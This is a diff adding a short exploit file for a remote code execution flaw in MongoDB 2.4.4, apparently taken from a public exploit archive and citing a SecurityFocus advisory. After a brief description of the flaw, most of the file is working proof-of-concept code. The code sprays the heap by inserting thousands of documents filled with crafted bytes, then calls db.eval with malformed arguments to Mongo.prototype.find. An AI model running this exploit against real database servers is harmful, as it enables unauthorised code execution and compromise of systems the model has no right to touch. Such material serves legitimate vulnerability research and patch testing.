@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/61309/info
+
+MongoDB is prone to a remote code execution vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit this vulnerability to execute arbitrary code within the context of the affected application.
+
+MongoDB 2.4.4 is vulnerable; other versions may also be affected.
+
+use databaseMapped
+
+sizechunk=0x1338; chunk=""; for(i=0;i<sizechunk;i++){ chunk+="\x05\x7c\x77\x55\x08\x04\x00\x00"; } for(i=0;i<30000;i++){ db.my_collection.insert({my_chunk:chunk}) }
+
+db.eval('Mongo.prototype.find("a",{"b":"c"},"d","e","f","g","h")'); 
